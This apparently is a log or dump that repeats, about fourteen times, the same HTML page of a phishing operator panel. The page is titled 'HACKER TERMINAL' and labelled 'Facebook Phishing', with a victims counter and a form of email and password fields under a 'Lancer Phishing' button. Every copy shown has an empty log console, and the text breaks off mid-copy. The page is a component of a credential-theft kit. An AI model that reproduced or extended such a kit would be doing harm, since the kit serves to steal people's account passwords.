+06:35:40 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:40 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:40 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:40 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:40 -         .email{color:#ff0;font-weight:bold;}
+06:35:40 -         .ip{color:#0ff;}
+06:35:40 -         .time{color:#ff6600;}
+06:35:40 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:40 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:40 -         .btn:hover{background:#0a0;}
+06:35:40 -         .btn-red{background:#f00;color:#fff;}
+06:35:40 -     </style>
+06:35:40 - </head>
+06:35:40 - <body>
+06:35:40 -     <div class="header">
+06:35:40 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:40 -     </div>
+06:35:40 -     <div class="console" id="console">
+06:35:40 -             </div>
+06:35:40 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:40 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:40 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:40 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:40 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:40 -     </form>
+06:35:40 -     <script>
+06:35:40 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:40 -     </script>
+06:35:40 - </body>
+06:35:40 - </html>
+06:35:41 - <!DOCTYPE html>
+06:35:41 - <html>
+06:35:41 - <head>
+06:35:41 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:41 -     <meta http-equiv="refresh" content="5">
+06:35:41 -     <style>
+06:35:41 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:41 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:41 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:41 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:41 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:41 -         .email{color:#ff0;font-weight:bold;}
+06:35:41 -         .ip{color:#0ff;}
+06:35:41 -         .time{color:#ff6600;}
+06:35:41 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:41 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:41 -         .btn:hover{background:#0a0;}
+06:35:41 -         .btn-red{background:#f00;color:#fff;}
+06:35:41 -     </style>
+06:35:41 - </head>
+06:35:41 - <body>
+06:35:41 -     <div class="header">
+06:35:41 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:41 -     </div>
+06:35:41 -     <div class="console" id="console">
+06:35:41 -             </div>
+06:35:41 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:41 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:41 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:41 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:41 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:41 -     </form>
+06:35:41 -     <script>
+06:35:41 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:41 -     </script>
+06:35:41 - </body>
+06:35:41 - </html>
+06:35:42 - <!DOCTYPE html>
+06:35:42 - <html>
+06:35:42 - <head>
+06:35:42 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:42 -     <meta http-equiv="refresh" content="5">
+06:35:42 -     <style>
+06:35:42 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:42 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:42 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:42 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:42 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:42 -         .email{color:#ff0;font-weight:bold;}
+06:35:42 -         .ip{color:#0ff;}
+06:35:42 -         .time{color:#ff6600;}
+06:35:42 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:42 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:42 -         .btn:hover{background:#0a0;}
+06:35:42 -         .btn-red{background:#f00;color:#fff;}
+06:35:42 -     </style>
+06:35:42 - </head>
+06:35:42 - <body>
+06:35:42 -     <div class="header">
+06:35:42 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:42 -     </div>
+06:35:42 -     <div class="console" id="console">
+06:35:42 -             </div>
+06:35:42 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:42 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:42 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:42 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:42 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:42 -     </form>
+06:35:42 -     <script>
+06:35:42 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:42 -     </script>
+06:35:42 - </body>
+06:35:42 - </html>
+06:35:43 - <!DOCTYPE html>
+06:35:43 - <html>
+06:35:43 - <head>
+06:35:43 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:43 -     <meta http-equiv="refresh" content="5">
+06:35:43 -     <style>
+06:35:43 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:43 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:43 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:43 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:43 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:43 -         .email{color:#ff0;font-weight:bold;}
+06:35:43 -         .ip{color:#0ff;}
+06:35:43 -         .time{color:#ff6600;}
+06:35:43 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:43 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:43 -         .btn:hover{background:#0a0;}
+06:35:43 -         .btn-red{background:#f00;color:#fff;}
+06:35:43 -     </style>
+06:35:43 - </head>
+06:35:43 - <body>
+06:35:43 -     <div class="header">
+06:35:43 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:43 -     </div>
+06:35:43 -     <div class="console" id="console">
+06:35:43 -             </div>
+06:35:43 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:43 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:43 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:43 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:43 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:43 -     </form>
+06:35:43 -     <script>
+06:35:43 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:43 -     </script>
+06:35:43 - </body>
+06:35:43 - </html>
+06:35:44 - <!DOCTYPE html>
+06:35:44 - <html>
+06:35:44 - <head>
+06:35:44 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:44 -     <meta http-equiv="refresh" content="5">
+06:35:44 -     <style>
+06:35:44 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:44 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:44 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:44 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:44 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:44 -         .email{color:#ff0;font-weight:bold;}
+06:35:44 -         .ip{color:#0ff;}
+06:35:44 -         .time{color:#ff6600;}
+06:35:44 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:44 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:44 -         .btn:hover{background:#0a0;}
+06:35:44 -         .btn-red{background:#f00;color:#fff;}
+06:35:44 -     </style>
+06:35:44 - </head>
+06:35:44 - <body>
+06:35:44 -     <div class="header">
+06:35:44 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:44 -     </div>
+06:35:44 -     <div class="console" id="console">
+06:35:44 -             </div>
+06:35:44 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:44 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:44 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:44 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:44 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:44 -     </form>
+06:35:44 -     <script>
+06:35:44 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:44 -     </script>
+06:35:44 - </body>
+06:35:44 - </html>
+06:35:45 - <!DOCTYPE html>
+06:35:45 - <html>
+06:35:45 - <head>
+06:35:45 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:45 -     <meta http-equiv="refresh" content="5">
+06:35:45 -     <style>
+06:35:45 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:45 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:45 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:45 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:45 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:45 -         .email{color:#ff0;font-weight:bold;}
+06:35:45 -         .ip{color:#0ff;}
+06:35:46 -         .time{color:#ff6600;}
+06:35:46 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:46 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:46 -         .btn:hover{background:#0a0;}
+06:35:46 -         .btn-red{background:#f00;color:#fff;}
+06:35:46 -     </style>
+06:35:46 - </head>
+06:35:46 - <body>
+06:35:46 -     <div class="header">
+06:35:46 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:46 -     </div>
+06:35:46 -     <div class="console" id="console">
+06:35:46 -             </div>
+06:35:46 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:46 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:46 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:46 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:46 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:46 -     </form>
+06:35:46 -     <script>
+06:35:46 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:46 -     </script>
+06:35:46 - </body>
+06:35:46 - </html>
+06:35:47 - <!DOCTYPE html>
+06:35:47 - <html>
+06:35:47 - <head>
+06:35:47 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:47 -     <meta http-equiv="refresh" content="5">
+06:35:47 -     <style>
+06:35:47 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:47 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:47 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:47 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:47 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:47 -         .email{color:#ff0;font-weight:bold;}
+06:35:47 -         .ip{color:#0ff;}
+06:35:47 -         .time{color:#ff6600;}
+06:35:47 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:47 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:47 -         .btn:hover{background:#0a0;}
+06:35:47 -         .btn-red{background:#f00;color:#fff;}
+06:35:47 -     </style>
+06:35:47 - </head>
+06:35:47 - <body>
+06:35:47 -     <div class="header">
+06:35:47 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:47 -     </div>
+06:35:47 -     <div class="console" id="console">
+06:35:47 -             </div>
+06:35:47 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:47 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:47 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:47 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:47 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:47 -     </form>
+06:35:47 -     <script>
+06:35:47 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:47 -     </script>
+06:35:47 - </body>
+06:35:47 - </html>
+06:35:48 - <!DOCTYPE html>
+06:35:48 - <html>
+06:35:48 - <head>
+06:35:48 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:48 -     <meta http-equiv="refresh" content="5">
+06:35:48 -     <style>
+06:35:48 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:48 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:48 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:48 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:48 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:48 -         .email{color:#ff0;font-weight:bold;}
+06:35:48 -         .ip{color:#0ff;}
+06:35:48 -         .time{color:#ff6600;}
+06:35:48 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:48 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:48 -         .btn:hover{background:#0a0;}
+06:35:48 -         .btn-red{background:#f00;color:#fff;}
+06:35:48 -     </style>
+06:35:48 - </head>
+06:35:48 - <body>
+06:35:48 -     <div class="header">
+06:35:48 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:48 -     </div>
+06:35:48 -     <div class="console" id="console">
+06:35:48 -             </div>
+06:35:48 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:48 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:48 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:48 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:48 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:48 -     </form>
+06:35:48 -     <script>
+06:35:48 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:48 -     </script>
+06:35:48 - </body>
+06:35:48 - </html>
+06:35:49 - <!DOCTYPE html>
+06:35:49 - <html>
+06:35:49 - <head>
+06:35:49 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:49 -     <meta http-equiv="refresh" content="5">
+06:35:49 -     <style>
+06:35:49 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:49 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:49 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:49 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:49 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:49 -         .email{color:#ff0;font-weight:bold;}
+06:35:49 -         .ip{color:#0ff;}
+06:35:49 -         .time{color:#ff6600;}
+06:35:49 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:49 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:49 -         .btn:hover{background:#0a0;}
+06:35:49 -         .btn-red{background:#f00;color:#fff;}
+06:35:49 -     </style>
+06:35:49 - </head>
+06:35:49 - <body>
+06:35:49 -     <div class="header">
+06:35:49 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:49 -     </div>
+06:35:49 -     <div class="console" id="console">
+06:35:49 -             </div>
+06:35:49 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:49 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:49 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:49 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:49 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:49 -     </form>
+06:35:49 -     <script>
+06:35:49 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:49 -     </script>
+06:35:49 - </body>
+06:35:49 - </html>
+06:35:50 - <!DOCTYPE html>
+06:35:50 - <html>
+06:35:50 - <head>
+06:35:50 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:50 -     <meta http-equiv="refresh" content="5">
+06:35:50 -     <style>
+06:35:50 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:50 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:50 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:50 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:50 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:50 -         .email{color:#ff0;font-weight:bold;}
+06:35:50 -         .ip{color:#0ff;}
+06:35:50 -         .time{color:#ff6600;}
+06:35:50 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:50 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:50 -         .btn:hover{background:#0a0;}
+06:35:50 -         .btn-red{background:#f00;color:#fff;}
+06:35:50 -     </style>
+06:35:50 - </head>
+06:35:50 - <body>
+06:35:50 -     <div class="header">
+06:35:50 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:50 -     </div>
+06:35:50 -     <div class="console" id="console">
+06:35:50 -             </div>
+06:35:50 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:50 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:50 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:50 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:50 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:50 -     </form>
+06:35:50 -     <script>
+06:35:50 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:50 -     </script>
+06:35:50 - </body>
+06:35:50 - </html>
+06:35:51 - <!DOCTYPE html>
+06:35:51 - <html>
+06:35:51 - <head>
+06:35:51 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:51 -     <meta http-equiv="refresh" content="5">
+06:35:51 -     <style>
+06:35:51 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:51 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:51 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:51 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:51 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:51 -         .email{color:#ff0;font-weight:bold;}
+06:35:51 -         .ip{color:#0ff;}
+06:35:51 -         .time{color:#ff6600;}
+06:35:51 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:51 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:51 -         .btn:hover{background:#0a0;}
+06:35:51 -         .btn-red{background:#f00;color:#fff;}
+06:35:51 -     </style>
+06:35:51 - </head>
+06:35:51 - <body>
+06:35:51 -     <div class="header">
+06:35:51 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:51 -     </div>
+06:35:51 -     <div class="console" id="console">
+06:35:51 -             </div>
+06:35:51 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:51 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:51 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:51 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:51 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:51 -     </form>
+06:35:51 -     <script>
+06:35:51 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:51 -     </script>
+06:35:51 - </body>
+06:35:51 - </html>
+06:35:52 - <!DOCTYPE html>
+06:35:52 - <html>
+06:35:52 - <head>
+06:35:52 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:52 -     <meta http-equiv="refresh" content="5">
+06:35:52 -     <style>
+06:35:52 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:52 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:52 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:52 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:52 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:52 -         .email{color:#ff0;font-weight:bold;}
+06:35:52 -         .ip{color:#0ff;}
+06:35:52 -         .time{color:#ff6600;}
+06:35:52 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:52 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:52 -         .btn:hover{background:#0a0;}
+06:35:52 -         .btn-red{background:#f00;color:#fff;}
+06:35:52 -     </style>
+06:35:52 - </head>
+06:35:52 - <body>
+06:35:52 -     <div class="header">
+06:35:52 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:52 -     </div>
+06:35:52 -     <div class="console" id="console">
+06:35:52 -             </div>
+06:35:52 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:52 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:52 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:52 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:52 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:52 -     </form>
+06:35:52 -     <script>
+06:35:52 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:52 -     </script>
+06:35:52 - </body>
+06:35:52 - </html>
+06:35:53 - <!DOCTYPE html>
+06:35:53 - <html>
+06:35:53 - <head>
+06:35:53 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:53 -     <meta http-equiv="refresh" content="5">
+06:35:53 -     <style>
+06:35:53 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:53 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:53 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:53 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:53 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:53 -         .email{color:#ff0;font-weight:bold;}
+06:35:53 -         .ip{color:#0ff;}
+06:35:53 -         .time{color:#ff6600;}
+06:35:53 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
+06:35:53 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
+06:35:53 -         .btn:hover{background:#0a0;}
+06:35:53 -         .btn-red{background:#f00;color:#fff;}
+06:35:53 -     </style>
+06:35:53 - </head>
+06:35:53 - <body>
+06:35:53 -     <div class="header">
+06:35:53 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
+06:35:53 -     </div>
+06:35:53 -     <div class="console" id="console">
+06:35:53 -             </div>
+06:35:53 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
+06:35:53 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
+06:35:53 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
+06:35:53 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
+06:35:53 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
+06:35:53 -     </form>
+06:35:53 -     <script>
+06:35:53 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
+06:35:53 -     </script>
+06:35:53 - </body>
+06:35:54 - </html>
+06:35:55 - <!DOCTYPE html>
+06:35:55 - <html>
+06:35:55 - <head>
+06:35:55 -     <title>🔥 HACKER TERMINAL v2.0</title>
+06:35:55 -     <meta http-equiv="refresh" content="5">
+06:35:55 -     <style>
+06:35:55 -         *{margin:0;padding:0;box-sizing:border-box;}
+06:35:55 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
+06:35:55 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
+06:35:55 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
+06:35:55 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
+06:35:55 -         .email{color:#ff0;font-weight:bold;}
+06:35:55 -         .ip{color:#0ff;}
